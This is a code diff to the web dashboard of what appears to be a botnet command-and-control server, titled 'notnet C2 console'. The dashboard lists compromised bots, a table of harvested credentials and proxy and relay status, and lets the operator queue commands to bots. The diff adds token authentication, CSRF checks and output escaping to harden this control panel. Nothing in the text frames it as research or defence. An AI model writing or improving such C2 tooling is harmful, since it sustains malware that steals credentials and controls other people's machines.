@@ -1124,7 +1124,25 @@ class ConsoleHandler(BaseHTTPRequestHandler):
             params = parse_qs(q[1])
             if hmac.compare_digest(params.get("token", [""])[0], tok):
                 return True, None
+        # X-Console-Token header (dashboard XHR; also the CSRF guard, #213)
+        hdr = self.headers.get("X-Console-Token", "")
+        if hdr and hmac.compare_digest(hdr, tok):
+            return True, None
         return False, None
+
+    def _console_secret(self):
+        """Token used by the dashboard for auth + CSRF (#212/#213).
+
+        With --console-token this is the console token itself; in loopback
+        tokenless mode we mint a per-process secret so POST /api/queue can
+        still require a custom header no cross-site form can send."""
+        if self.c2.console_token:
+            return self.c2.console_token
+        tok = getattr(self.c2, "console_csrf", None)
+        if not tok:
+            tok = secrets.token_hex(16)
+            self.c2.console_csrf = tok
+        return tok
 
     def do_GET(self):
         c2 = self.c2
@@ -1173,7 +1191,9 @@ class ConsoleHandler(BaseHTTPRequestHandler):
                        "application/json")
             return
         if path in ("/", "/console", "/index.html"):
-            self._send(console_html())
+            # #212: embed the auth/CSRF secret so the dashboard XHRs can
+            # authenticate (page itself was already gated by _check_auth).
+            self._send(console_html(self._console_secret()))
             return
         self._send("not found", "text/plain", 404)
 
@@ -1186,6 +1206,17 @@ class ConsoleHandler(BaseHTTPRequestHandler):
             return
         path = self.path.split("?", 1)[0]
         if path == "/api/queue":
+            # #213 CSRF guard: require BOTH a JSON Content-Type and the
+            # per-instance X-Console-Token header. A cross-site text/plain
+            # form POST can craft a JSON body but cannot set either without
+            # triggering a CORS preflight that this handler fails.
+            ctype = (self.headers.get("Content-Type") or "").split(";")[0].strip()
+            csrf = self.headers.get("X-Console-Token", "")
+            if ctype != "application/json" or not csrf or not hmac.compare_digest(
+                    csrf, self._console_secret()):
+                self._send(json.dumps({"error": "forbidden"}),
+                           "application/json", 403)
+                return
             n = int(self.headers.get("Content-Length") or 0)
             raw = self.rfile.read(n) if n else b""
             try:
@@ -1210,7 +1241,10 @@ class ConsoleHandler(BaseHTTPRequestHandler):
         self._send(json.dumps({"error": "unknown"}), "application/json", 404)
 
 
-def console_html():
+def console_html(token=""):
+    # #212: token is embedded so every fetch carries X-Console-Token
+    # (auth with --console-token, CSRF guard without). JSON-safe via json.
+    tok_js = json.dumps(token)
     return """<!DOCTYPE html>
 <html><head><meta charset="utf-8"><title>notnet C2 console</title>
 <style>
@@ -1243,7 +1277,8 @@ def console_html():
 <table id="creds"><thead><tr><th>id</th><th>line</th><th>src</th>
 <th>at</th></tr></thead><tbody></tbody></table>
 <script>
-async function j(u){const r=await fetch(u);return r.json()}
+const TOKEN = __CONSOLE_TOKEN__;
+async function j(u){const r=await fetch(u,{headers:{'X-Console-Token':TOKEN}});return r.json()}
 function esc(s){const d=document.createElement('div');d.textContent=(s==null?'':String(s));return d.innerHTML}
 async function refresh(){
  const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
@@ -1251,9 +1286,11 @@ async function refresh(){
  const up=x.ago<90;const cls=up?'up':'stale';
  // #177: every bot-supplied field goes through esc() — hostname/tag/ip
  // come from unauthenticated-ish heartbeats and must never hit innerHTML raw.
+ // #211: uptime/scan_count/cred_count are heartbeat-controlled too (SQLite
+ // INTEGER affinity keeps TEXT verbatim), so they get esc() as well.
  tr.innerHTML=`<td>${esc(x.hostname)}</td><td>${esc(x.tag||'')}</td><td>${esc(x.ip||'')}</td>
- <td>${esc(x.version||'')}</td><td>${x.uptime||0}</td><td>${x.scan_count||0}</td>
- <td>${x.cred_count||0}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
+ <td>${esc(x.version||'')}</td><td>${esc(x.uptime||0)}</td><td>${esc(x.scan_count||0)}</td>
+ <td>${esc(x.cred_count||0)}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
  <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
  <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
  tb.appendChild(tr);}
@@ -1289,13 +1326,14 @@ async function refresh(){
 document.querySelector('#qform').addEventListener('submit',async e=>{
  e.preventDefault();
  const body={target:qtarget.value,cmd:qcmd.value,args:qargs.value};
- const r=await fetch('/api/queue',{method:'POST',headers:{'Content-Type':'application/json'},
+ const r=await fetch('/api/queue',{method:'POST',
+ headers:{'Content-Type':'application/json','X-Console-Token':TOKEN},
  body:JSON.stringify(body)});const jj=await r.json();
  qres.textContent='queued id='+jj.id+' cmd='+jj.cmd+' -> '+(jj.target||'any');
  qcmd.value='';qargs.value='';
 });
 setInterval(refresh,3000);refresh();
-</script></body></html>"""
+</script></body></html>""".replace("__CONSOLE_TOKEN__", tok_js)
 
 
 def serve_console(c2, port, bind="127.0.0.1"):
